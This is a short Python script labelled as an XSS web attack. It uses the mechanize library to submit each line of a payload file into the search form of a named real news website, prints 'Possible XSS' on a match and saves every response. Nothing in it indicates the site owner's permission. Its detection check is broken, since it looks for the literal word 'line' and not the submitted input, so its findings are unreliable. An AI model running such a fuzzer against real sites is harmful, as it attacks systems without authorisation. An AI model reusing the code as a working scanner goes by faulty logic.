"""XSSi Web Attack."""

import mechanize


url = "https://www.politico.com/tipsheets/morning-money"
attack_no = 1
browser = mechanize.Browser()

with open("websites.txt") as x:
    for line in x:
        browser.open(url)
        browser.select_form(nr=0)
        browser["q"] = line
        res = browser.submit()
        content = res.read()

        if content.find(b'line') > 0:
            print("Possible XSS")

        output = open('response/' + str(attack_no) + '.txt', 'w')
        output.write(str(content))
        output.close()
        print(attack_no)
        attack_no += 1
